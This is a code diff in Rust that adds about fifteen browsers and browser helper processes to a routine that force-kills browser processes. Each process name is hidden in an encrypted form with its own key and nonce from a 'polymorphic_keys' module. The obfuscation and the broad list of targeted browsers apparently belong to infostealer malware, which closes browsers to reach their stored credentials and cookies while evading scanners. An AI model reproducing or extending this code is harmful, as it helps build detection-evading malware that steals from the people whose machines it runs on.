@@ -108,6 +108,19 @@ fn kill_browser_processes(
         (&crate::polymorphic_keys::KILL_LIBREWOLF_ENC, &crate::polymorphic_keys::KILL_LIBREWOLF_KEY, &crate::polymorphic_keys::KILL_LIBREWOLF_NONCE),
         (&crate::polymorphic_keys::KILL_YANDEX_ENC, &crate::polymorphic_keys::KILL_YANDEX_KEY, &crate::polymorphic_keys::KILL_YANDEX_NONCE),
         (&crate::polymorphic_keys::KILL_BROWSER_ENC, &crate::polymorphic_keys::KILL_BROWSER_KEY, &crate::polymorphic_keys::KILL_BROWSER_NONCE),
+        (&crate::polymorphic_keys::KILL_360CHROME_ENC, &crate::polymorphic_keys::KILL_360CHROME_KEY, &crate::polymorphic_keys::KILL_360CHROME_NONCE),
+        (&crate::polymorphic_keys::KILL_EPIC_ENC, &crate::polymorphic_keys::KILL_EPIC_KEY, &crate::polymorphic_keys::KILL_EPIC_NONCE),
+        (&crate::polymorphic_keys::KILL_URAN_ENC, &crate::polymorphic_keys::KILL_URAN_KEY, &crate::polymorphic_keys::KILL_URAN_NONCE),
+        (&crate::polymorphic_keys::KILL_7STAR_ENC, &crate::polymorphic_keys::KILL_7STAR_KEY, &crate::polymorphic_keys::KILL_7STAR_NONCE),
+        (&crate::polymorphic_keys::KILL_TORCH_ENC, &crate::polymorphic_keys::KILL_TORCH_KEY, &crate::polymorphic_keys::KILL_TORCH_NONCE),
+        (&crate::polymorphic_keys::KILL_KOMETA_ENC, &crate::polymorphic_keys::KILL_KOMETA_KEY, &crate::polymorphic_keys::KILL_KOMETA_NONCE),
+        (&crate::polymorphic_keys::KILL_ORBITUM_ENC, &crate::polymorphic_keys::KILL_ORBITUM_KEY, &crate::polymorphic_keys::KILL_ORBITUM_NONCE),
+        (&crate::polymorphic_keys::KILL_AMIGO_ENC, &crate::polymorphic_keys::KILL_AMIGO_KEY, &crate::polymorphic_keys::KILL_AMIGO_NONCE),
+        (&crate::polymorphic_keys::KILL_SPUTNIK_ENC, &crate::polymorphic_keys::KILL_SPUTNIK_KEY, &crate::polymorphic_keys::KILL_SPUTNIK_NONCE),
+        (&crate::polymorphic_keys::KILL_COCCOC_ENC, &crate::polymorphic_keys::KILL_COCCOC_KEY, &crate::polymorphic_keys::KILL_COCCOC_NONCE),
+        (&crate::polymorphic_keys::KILL_CENT_ENC, &crate::polymorphic_keys::KILL_CENT_KEY, &crate::polymorphic_keys::KILL_CENT_NONCE),
+        (&crate::polymorphic_keys::KILL_IRIDIUM_ENC, &crate::polymorphic_keys::KILL_IRIDIUM_KEY, &crate::polymorphic_keys::KILL_IRIDIUM_NONCE),
+        (&crate::polymorphic_keys::KILL_SLIMJET_ENC, &crate::polymorphic_keys::KILL_SLIMJET_KEY, &crate::polymorphic_keys::KILL_SLIMJET_NONCE),
     ];
 
     let helper_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
@@ -120,6 +133,8 @@ fn kill_browser_processes(
         (&crate::polymorphic_keys::KILL_BRAVE_UPDATE_ENC, &crate::polymorphic_keys::KILL_BRAVE_UPDATE_KEY, &crate::polymorphic_keys::KILL_BRAVE_UPDATE_NONCE),
         (&crate::polymorphic_keys::KILL_OPERA_UPDATE_ENC, &crate::polymorphic_keys::KILL_OPERA_UPDATE_KEY, &crate::polymorphic_keys::KILL_OPERA_UPDATE_NONCE),
         (&crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_ENC, &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_KEY, &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_NONCE),
+        (&crate::polymorphic_keys::KILL_PLUGIN_CONTAINER64_ENC, &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER64_KEY, &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER64_NONCE),
+        (&crate::polymorphic_keys::KILL_UPDATER_ENC, &crate::polymorphic_keys::KILL_UPDATER_KEY, &crate::polymorphic_keys::KILL_UPDATER_NONCE),
     ];
 
     unsafe {
